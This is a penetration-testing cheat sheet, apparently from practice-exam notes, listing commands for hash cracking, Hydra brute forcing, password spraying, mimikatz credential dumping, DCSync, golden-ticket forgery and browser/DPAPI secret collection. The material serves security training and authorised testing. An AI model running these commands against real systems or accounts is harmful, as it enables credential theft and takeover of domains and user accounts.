# Passwords and credential material

[Practice methodology](../Practice-Exam-Methodology.md) · [Reference index](00-Reference-Index.md)

Commands preserved from the original reference. Replace angle-bracket placeholders before running; check your installed tool’s help for version-specific options.


## hashcat

```bash
hashcat -m 0    md5hash /PATH/TO/WORDLIST               # crack MD5 hash
hashcat -m 100  sha1hash /PATH/TO/WORDLIST              # crack SHA1 hash
hashcat -m 1000 ntlmhash /PATH/TO/WORDLIST              # crack NTLM hash
hashcat -m 1800 sha512hash /PATH/TO/WORDLIST            # crack SHA512-crypt hash
hashcat -m 13100 kerberoast_hashes /PATH/TO/WORDLIST    # crack Kerberoast hash
hashcat -m 18200 asreproast_hashes /PATH/TO/WORDLIST    # crack AS-REP roast hash
hashcat -m 5600  netntlmv2 /PATH/TO/WORDLIST            # crack NetNTLMv2 hash
hashcat -m 3200  bcrypt /PATH/TO/WORDLIST               # crack bcrypt hash

# With rules
hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule    # crack NTLM with rule mutations
hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule                                   # crack bcrypt with custom rules

# Custom rules
echo \$1 > custom.rule                          # append 1
echo 'c' >> custom.rule                         # capitalize first
hashcat -r custom.rule --stdout wordlist.txt    # preview

# Identify hash type
hashcat --identify --user <FILE>    # identify hash mode from file

# OpenSSH key
openssl pkcs8 -in id_rsa -outform DER -out key.der -nocrypt    # convert OpenSSH key for cracking
hashcat -m 16200 key.der /PATH/TO/WORDLIST                     # crack OpenSSH private key
```

## John

```bash
keepass2john <FILE>                                        # extract KeePass hash for John
ssh2john id_rsa > <FILE>                                   # extract SSH key hash for John
zip2john <FILE> > <FILE>                                   # extract ZIP hash for John
john <FILE> --wordlist=/PATH/TO/WORDLIST --format=crypt    # crack hash with wordlist
john --show <FILE>                                         # show cracked credentials
```

## Hydra

```bash
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST <PROTOCOL>                                                                 # brute force one user against a service
hydra <RHOST> -L users.txt -P passwords.txt <PROTOCOL>                                                                      # brute force users and passwords
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"    # brute force HTTP form
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST http-post-form "/index.php:username=user&password=^PASS^:Login failed"     # brute force known HTTP user
hydra -L users.txt -p <PASSWORD> -m workgroup:{<DOMAIN>} <RHOST> smb2                                                       # password spray SMB2
```

## fcrack (ZIP)

```bash
fcrackzip -u -D -p /PATH/TO/WORDLIST <FILE>.zip    # crack ZIP password with dictionary
```

## mimikatz

```bash
privilege::debug                                                                    # enable debug privilege
sekurlsa::logonpasswords                                                            # dump logon credentials
sekurlsa::tickets /export                                                           # export Kerberos tickets
lsadump::sam                                                                        # dump local SAM hashes
lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>                              # DCSync krbtgt account
kerberos::golden /user:Administrator /domain:... /sid:... /krbtgt:<HASH> /id:500    # forge golden ticket
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi       # pass ticket into session
token::elevate                                                                      # impersonate elevated token
vault::cred                                                                         # dump Windows Vault credentials
vault::list                                                                         # list Windows Vault entries
```

## pypykatz

```bash
pypykatz lsa minidump lsass.dmp       # parse LSASS minidump offline
pypykatz registry --sam sam system    # parse SAM/SYSTEM hives offline
```

## Group Policy Preferences (GPP)

```bash
python3 gpp-decrypt.py -f Groups.xml     # decrypt GPP cpassword from XML
python3 gpp-decrypt.py -c <CPASSWORD>    # decrypt raw GPP cpassword
```

## DonPAPI

```bash
DonPAPI <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>            # collect DPAPI/browser secrets remotely
DonPAPI -local_auth <USERNAME>@<RHOST>                    # collect secrets with local auth
DonPAPI --hashes <LM>:<NT> <DOMAIN>/<USERNAME>@<RHOST>    # collect secrets using NTLM hash
```

## Kerbrute

```bash
./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/USERNAMES -t 50              # enumerate valid AD users
./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/USERNAMES <PASSWORD>    # spray one password over users
```

## LaZagne

```bash
laZagne.exe all    # dump locally stored credentials
```

## Wordlists

```bash
# CeWL
cewl -d 5 -m 3 -w wordlist.txt http://<RHOST>/index.php --with-numbers    # crawl site and build wordlist

# crunch
crunch 6 6 -t foobar%%% > wordlist                                 # generate patterned words
crunch 5 5 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -o wordlist.txt    # generate fixed-length charset wordlist

# CUPP (interactive)
./cupp -i    # generate targeted wordlist interactively

# Username Anarchy
./username-anarchy -f first,first.last,last,flast,f.last -i names.txt    # generate username permutations

# Add number suffixes
for i in {1..100}; do printf "Password@%d\n" $i >> wordlist.txt; done    # append numbered password candidates

# Mutate — remove number-only lines
sed -i '/^[0-9]*$/d' wordlist.txt    # remove numeric-only entries
```

## Key Wordlist Paths

```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt
/usr/share/hashcat/rules/best64.rule
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```
